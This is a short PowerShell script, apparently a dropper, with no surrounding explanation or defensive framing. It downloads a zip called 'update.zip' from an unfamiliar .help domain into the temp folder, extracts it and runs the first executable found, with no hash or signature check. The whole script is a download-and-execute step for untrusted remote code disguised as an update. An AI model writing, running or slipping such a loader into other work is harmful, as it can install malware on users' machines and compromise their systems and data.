$url = "https://cdp.wovplaying.help/update.zip"
$zip = Join-Path $env:TEMP "update.zip"
$extractDir = Join-Path $env:TEMP "update"

Invoke-WebRequest -Uri $url -OutFile $zip -UseBasicParsing

if (Test-Path $extractDir) {
    Remove-Item $extractDir -Recurse -Force
}
Expand-Archive -Path $zip -DestinationPath $extractDir -Force

$exe = Get-ChildItem -Path $extractDir -Filter "*.exe" -Recurse -File | Select-Object -First 1
Start-Process -FilePath $exe.FullName -Wait
